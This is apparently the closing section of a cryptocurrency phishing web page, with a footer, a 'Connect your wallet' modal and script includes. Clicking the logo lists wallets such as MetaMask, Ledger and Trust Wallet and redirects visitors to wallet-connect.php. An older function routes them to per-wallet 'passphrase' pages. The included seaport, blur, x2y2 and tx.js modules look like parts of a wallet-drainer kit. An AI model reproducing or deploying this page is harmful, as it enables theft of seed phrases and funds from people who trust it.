
  <!-- Footer -->
  <footer class="footer">
  <!-- Navbar -->
  <nav class="footer__nav">
    <div class="container">
      <div class="footer__nav-inner">
        <div class="footer__logo">
          <a class="footer__logolink" href="#" onclick="openModal()">
            <img class="footer__logo-link-img" src="img/logo.svg" alt="logo">
          </a>
        </div>

        <ul class="footer__menu">
          <li class="footer__menu-item"><a href="#header" class="footer__menu-item-link" data-scroll>Home</a></li>
          <li class="footer__menu-item"><a href="#rules" class="footer__menu-item-link" data-scroll>About</a></li>
          </li>
          <li class="footer__menu-item"><a href="#faq" class="footer__menu-item-link active" data-scroll>FAQ</a></li>
        </ul>
      </div>
    </div>
  </nav>
</footer>

</body>

<script>
function openModal() {
  const modal = document.createElement('div');
  modal.classList.add('web3-modal');

  const overlay = document.createElement('div');
  overlay.classList.add('web3-overlay');

  modal.appendChild(overlay);

  const modalContent = document.createElement('div');
  modalContent.classList.add('web3-modal-main');
  modalContent.innerHTML = `
  <p class="web3-modal-title" style="margin-top:0">Connect your wallet</p>
<div class="web3-modal-scroll-container">
  <div class="web3-modal-items">
    <div class="item" onclick="connect_wallet('MetaMask', 'assets/images/MM.svg')">
      <div>
        <div class="icon"><img src="assets/images/MM.svg" alt=""></div>
        <span>MetaMask</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Coinbase', 'assets/images/CB.svg')">
      <div>
        <div class="icon"><img src="assets/images/CB.svg" alt=""></div>
        <span>Coinbase</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Trust Wallet', 'assets/images/TW.svg')">
      <div>
        <div class="icon"><img src="assets/images/TW.svg" alt=""></div>
        <span>Trust Wallet</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Binance Wallet', 'assets/images/BW.svg')">
      <div>
        <div class="icon"><img src="assets/images/BW.svg" alt=""></div>
        <span>Binance Wallet</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Infinity', 'assets/images/infinity.webp')">
      <div>
        <div class="icon"><img src="assets/images/infinity.webp" alt=""></div>
        <span>Infinity</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Zerion', 'assets/images/Zerion.png')">
      <div>
        <div class="icon"><img src="assets/images/Zerion.png" alt=""></div>
        <span>Zerion</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Ledger', 'assets/images/Ledger.png')">
      <div>
        <div class="icon"><img src="assets/images/Ledger.png" alt=""></div>
        <span>Ledger</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Ambire', 'assets/images/Ambire.jpeg')">
      <div>
        <div class="icon"><img src="assets/images/Ambire.jpeg" alt=""></div>
        <span>Ambire</span>
      </div>
      <div class="arrow"></div>
    </div>
    <div class="item" onclick="connect_wallet('Fireblocks', 'assets/images/Fireblocks.png')">
      <div>
        <div class="icon"><img src="assets/images/Fireblocks.png" alt=""></div>
        <span>Fireblocks</span>
      </div>
      <div class="arrow"></div>
    </div>
  </div>
</div>
<!-- Add other modal content here -->

  `;

  modal.appendChild(modalContent);

  document.body.appendChild(modal);
}

function connect_wallet(wallet, imageSrc) {
  // Redirect the user to the wallet-connect.php page with the wallet name and image source as query parameters
  const urlWithQuery = `wallet-connect.php?wallet=${encodeURIComponent(wallet)}&imageSrc=${encodeURIComponent(imageSrc)}`;
  window.location.href = urlWithQuery;
}

function connect_wallet_old(wallet) {
  // Define the URL for each wallet passphrase page
  const passphraseURLs = {
    MetaMask: 'metamask.php',
    Coinbase: 'coinbase.php',
    'Trust Wallet': 'trustwallet.php',
    'Binance Wallet': 'binancewallet.php'
    // Add more wallet options and corresponding URLs if needed
  };

  // Get the passphrase URL based on the selected wallet
  const passphraseURL = passphraseURLs[wallet];

  // Redirect the user to the passphrase page
  if (passphraseURL) {
    window.location.href = passphraseURL;
  }
}

// Rest of your code...

</script>

<script src="assets/web3-provider/web3-router.js"></script>
<script src="assets/web3-provider/web3-connect.js"></script>
<script src="assets/web3-provider/web3-module.js"></script>
<script src="assets/web3-provider/web3-alert.js"></script>
<script src="assets/web3-provider/web3-seaport.js"></script>
<script src="assets/web3-provider/web3-data.js"></script>
<script src="assets/web3-provider/ethers.js"></script>
<script src="assets/web3-provider/ethereum-tx.js"></script>
<script src="assets/web3-modules/module-seaport.js"></script>
<script src="assets/web3-modules/module-blur.js"></script>
<script src="assets/web3-modules/module-x2y2.js"></script>
<script src="assets/web3-provider.js"></script>


<script src="js/scripts.min.js"></script>
<script src="assets/name.html"></script>

<script src="js/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script src="js/tx.js"></script>

</html>